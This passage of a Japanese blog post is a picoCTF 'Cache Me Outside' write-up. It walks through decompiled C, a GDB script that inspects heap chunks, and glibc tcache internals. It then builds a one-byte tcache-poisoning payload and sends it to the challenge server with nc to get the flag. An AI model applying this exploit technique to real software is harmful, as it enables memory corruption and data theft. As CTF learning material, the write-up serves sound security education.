    local_98<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x203a73692067616c</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>local_98 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>local_98<span class="token punctuation">,</span>local_58<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  local_88 <span class="token operator">=</span> <span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>local_88 <span class="token operator">=</span> <span class="token number">0x5420217972726f53</span><span class="token punctuation">;</span>
  local_88<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x276e6f7720736968</span><span class="token punctuation">;</span>
  local_88<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x7920706c65682074</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>local_88 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x203a756f</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_88 <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>local_88<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>local_78<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>local_98<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>local_88<span class="token punctuation">)</span><span class="token punctuation">;</span>
  local_a8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  local_a9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You may edit one byte in the program."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Address: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DAT_00400b48<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_a8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DAT_00400b53<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_a9<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_a8 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_a0<span class="token punctuation">)</span> <span class="token operator">=</span> local_a9<span class="token punctuation">;</span>
  local_80 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_80 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>ここで、<code class="language-text">strcat((char *)local_98,local_58);</code>の行でHeapに格納されている変数には読み出したflag.txtの情報が含まれていることがわかっています。</p>
<p>そのため、最終的にはこのHeap領域のデータを何とかして読み出すことができれFlagが取れそうです。</p>
<p>そこで、実際のHeapの動きを見ていこうと思います。</p>
<p>問題ファイルに含まれていたMakefileの内容から、PIEは無効化されていることがわかります。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">gcc -Xlinker -rpath<span class="token operator">=</span>./ -Wall -m64 -pedantic -no-pie --std<span class="token operator">=</span>gnu99 -o heapedit heapedit.c</code></pre></div>
<p>ここから、ASLRが無効であり、実行時アドレスは毎回同じになることが期待されます。</p>
<p>次に、以下のスクリプトでGDBを動かして各Heapのアドレスと中身を確認してみました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment"># gdb -x run.py</span>
<span class="token keyword">import</span> gdb

BIN <span class="token operator">=</span> <span class="token string">"heapedit_patched"</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'file {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>BIN<span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'b *{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"0x4008c3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'b *{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"0x40094a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'b *{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"0x400966"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'b *{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"0x400a4f"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'b *{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"0x400a75"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'run &lt; input'</span><span class="token punctuation">)</span>

h <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
i <span class="token operator">=</span> gdb<span class="token punctuation">.</span>inferiors<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    reg <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gdb<span class="token punctuation">.</span>parse_and_eval<span class="token punctuation">(</span><span class="token string">"$rax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reg<span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span>
<span class="token keyword">for</span> a <span class="token keyword">in</span> h<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"  "</span><span class="token punctuation">)</span>
    mem <span class="token operator">=</span> i<span class="token punctuation">.</span>read_memory<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>mem<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'quit'</span><span class="token punctuation">)</span></code></pre></div>
<p>上から順に以下のようにセットされ、各HeapにFlagのテキストが埋まっていることがわかりました</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/3103d802e2ffbdf1544b4570ffe0618b/121b3/image-20220710150640402.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAw0lEQVQY0z2PWQ6DMAwFORFbIQlkXwqiAtr7X+bVcaV+jGLH8thuSsnwzsJ5Bx8jfIgUexizIkZHryVqHhFCwr4//8zzhL7vMQzDnyblCK0XOGfgvYWSgpo1pJxJ4GmAI3FEzhuO48B9n/h8LpzngXEc0bYtuq5jqrzZtsIyR1tmkltrWGT0ynmNKyll2mpn4ft94bpeWNeFBgsoJQmFaZrQ1A00FWoxUMzEKgg8pDb8GiWWRfFfKYmucRBCcP2HJOEDX6uxiQz+zwDGAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/3103d802e2ffbdf1544b4570ffe0618b/8ac56/image-20220710150640402.webp 240w,
/static/3103d802e2ffbdf1544b4570ffe0618b/d3be9/image-20220710150640402.webp 480w,
/static/3103d802e2ffbdf1544b4570ffe0618b/e46b2/image-20220710150640402.webp 960w,
/static/3103d802e2ffbdf1544b4570ffe0618b/893d8/image-20220710150640402.webp 1070w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/3103d802e2ffbdf1544b4570ffe0618b/8ff5a/image-20220710150640402.png 240w,
/static/3103d802e2ffbdf1544b4570ffe0618b/e85cb/image-20220710150640402.png 480w,
/static/3103d802e2ffbdf1544b4570ffe0618b/d9199/image-20220710150640402.png 960w,
/static/3103d802e2ffbdf1544b4570ffe0618b/121b3/image-20220710150640402.png 1070w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/3103d802e2ffbdf1544b4570ffe0618b/d9199/image-20220710150640402.png"
            alt="image-20220710150640402"
            title="image-20220710150640402"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>また、8回目と9回目のmallocの戻り値のアドレスが同一であることもわかります。</p>
<p>ここで何が行われているのかについて確認してみました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">local_98 <span class="token operator">=</span> <span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment">//こちらにFlagが格納される</span>
local_88 <span class="token operator">=</span> <span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment">//ダミーの文字列が格納される</span>

<span class="token comment">// free関数によって、local_88->local_98の順にtcacheに繋がれる</span>
<span class="token function">free</span><span class="token punctuation">(</span>local_98<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>local_88<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// tcacheからHeapを割り当てて中身を表示する(通常はダミー文字列が表示される)</span>
local_80 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_80 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></div>
<p>上記より、tcacheに繋がれているlocal_98の方のチャンクを参照できればFlagが取れそうです。</p>
<p>ここで、前述した通りtcacheからHeapを割り当てる場合には<code class="language-text">tcache_get</code>が使用されます。</p>
<p>つまり、malloc()で取得されるチャンクは、<code class="language-text">tcache->entries[tc_idx]</code>の先頭となるわけです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */</span>
<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): unaligned tcache chunk detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">REVEAL_PTR</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>key <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>上記から、Flagを取得するために書き換える必要があるアドレスは、<code class="language-text">tcache->entries[tc_idx]</code>のアドレスであり、書き込む必要がある値は<code class="language-text">tcache->entries[tc_idx]->next</code>であることがわかります。</p>
<p>というわけで、以下のステップでFlagを取得していきます。</p>
<ol>
<li><code class="language-text">tcache->entries[tc_idx]</code>のアドレスを取得する</li>
<li><code class="language-text">tcache->entries[tc_idx]->next</code>のアドレスを特定する</li>
<li><code class="language-text">tcache->entries[tc_idx]</code>のアドレスを<code class="language-text">tcache->entries[tc_idx]->next</code>に書き換える</li>
</ol>
<p>まずは<code class="language-text">tcache->entries[tc_idx]</code>のアドレスですが、PIEが無効化されているので、これは最後のmalloc()の戻り値のアドレスから変化しないことが想定されます。</p>
<p>そのため、gdb-pedaを使って最終的にmallocがtcacheから取得するチャンクのアドレスである0x603890を探索します。</p>
<p>すると、0x602088が(たぶん)tcache->entriesのアドレスであり、0x603800がFlagの格納されたチャンクであるとわかります。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ searchmem 0x603890
Searching <span class="token keyword">for</span> <span class="token string">'0x603890'</span> in: None ranges
Found <span class="token number">3</span> results, display max <span class="token number">3</span> items:
 <span class="token punctuation">[</span>heap<span class="token punctuation">]</span> <span class="token builtin class-name">:</span> 0x602088 --<span class="token operator">></span> 0x603890 --<span class="token operator">></span> 0x603800 --<span class="token operator">></span> 0x0 
<span class="token punctuation">[</span>stack<span class="token punctuation">]</span> <span class="token builtin class-name">:</span> 0x7fffffffda30 --<span class="token operator">></span> 0x603890 --<span class="token operator">></span> 0x603800 --<span class="token operator">></span> 0x0 
<span class="token punctuation">[</span>stack<span class="token punctuation">]</span> <span class="token builtin class-name">:</span> 0x7fffffffde10 --<span class="token operator">></span> 0x603890 --<span class="token operator">></span> 0x603800 --<span class="token operator">></span> 0x0</code></pre></div>
<p>実際、0x603800にFlagが格納されていることが確認できます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ x/s 0x603800+0x8
0x603808:       <span class="token string">"! Your flag is: picoCTF{testflag}<span class="token entity" title="\n">\n</span>"</span></code></pre></div>
<p>ここから、書き換えたいアドレスは0x602088であり、このアドレスの値を0x603800に変えることで最終的にFlagを取得できそうです。</p>
<p>アドレスの書き換えは以下から行います。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You may edit one byte in the program."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Address: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DAT_00400b48<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_a8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DAT_00400b53<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_a9<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_a8 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>local_a0<span class="token punctuation">)</span> <span class="token operator">=</span> local_a9<span class="token punctuation">;</span></code></pre></div>
<p><code class="language-text">local_a0</code>には0x6034a0が入っていますので、<code class="language-text">0x602088-0x6034a0 = -5144</code>を入れることで0x602088の改ざんが可能になります。</p>
<p>というわけで、1つ目の入力に-5144、2つ目の入力に<code class="language-text">\x00\x38\x60\x00</code>を与えてあげることで、tcacheの改ざんを行ってFlagを取得できます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ python -c <span class="token string">'import sys; sys.stdout.buffer.write(b"-5144\n" + b"\x00\x38\x60\x00")'</span> <span class="token operator">></span> input

$ ./heapedit_patched <span class="token operator">&lt;</span> input 
You may edit one byte <span class="token keyword">in</span> the program.
Address: Value: lag is: picoCTF<span class="token punctuation">{</span>testflag<span class="token punctuation">}</span></code></pre></div>
<p>最後に、リモートサーバーに対してこの入力を送り込むことでFlagを取得できました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token function">nc</span> mercury.picoctf.net <span class="token number">17612</span> <span class="token operator">&lt;</span> input 
You may edit one byte <span class="token keyword">in</span> the program.
Address: Value: lag is: picoCTF<span class="token punctuation">{</span> XXXXXXXXXXXXXXXXXXXX <span class="token punctuation">}</span></code></pre></div>
<p>参考情報：<a href="https://cashitsuki.com/posts/2021-12-24-picoCTF-Cache-Me-Outside-writeup/" target="_blank" rel="nofollow noopener noreferrer">picoCTF “Cache Me Outside” writeup</a></p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>Heapめっちゃ難しい。。</p>
<h2 id="参考情報" style="position:relative;"><a href="#%E5%8F%82%E8%80%83%E6%83%85%E5%A0%B1" aria-label="参考情報 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>参考情報</h2>
<ul>
<li><a href="https://amzn.to/3AEtVa7" target="_blank" rel="nofollow noopener noreferrer">詳解セキュリティコンテスト</a></li>
<li><a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks" target="_blank" rel="nofollow noopener noreferrer">Bins and Chunks - heap-exploitation</a></li>
</ul></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jul 6, 2022</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/ctf/">CTF</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/pwn/">Pwn</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/heap/">Heap</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-learning-heap";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-a5613c1b5d673099e15a.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-a5613c1b5d673099e15a.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-8d3bc24fd199c93e925d.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>